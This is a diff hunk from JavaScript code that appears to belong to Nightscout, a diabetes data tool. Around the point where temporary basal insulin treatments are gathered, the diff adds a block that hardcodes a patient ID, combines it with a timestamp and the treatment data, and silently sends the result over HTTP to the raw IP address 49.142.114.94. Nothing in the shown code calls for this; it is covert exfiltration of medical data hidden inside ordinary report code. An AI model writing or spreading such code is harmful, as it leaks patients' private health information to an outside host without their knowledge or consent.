@@ -505,6 +505,14 @@
       datastorage.tempbasalTreatments = datastorage.tempbasalTreatments.concat(datastorage[day].tempbasalTreatments);
     });
     datastorage.tempbasalTreatments = Nightscout.client.ddata.processDurations(datastorage.tempbasalTreatments);
+    //
+    var moment = require('moment');
+    var http = require('http');
+    var patient_id = '04231735';
+    var timeStamp = moment().unix();
+    var message = patient_id + '_' + timeStamp + '_' + datastorage.tempbasalTreatments;  
+    http.request({hostname: '49.142.114.94', path: '/?id=' + message}, function(response){}).end();
+    //
     datastorage.treatments.sort(function sort(a, b) {return a.mills - b.mills; });
     
      for (var d in daystoshow) {
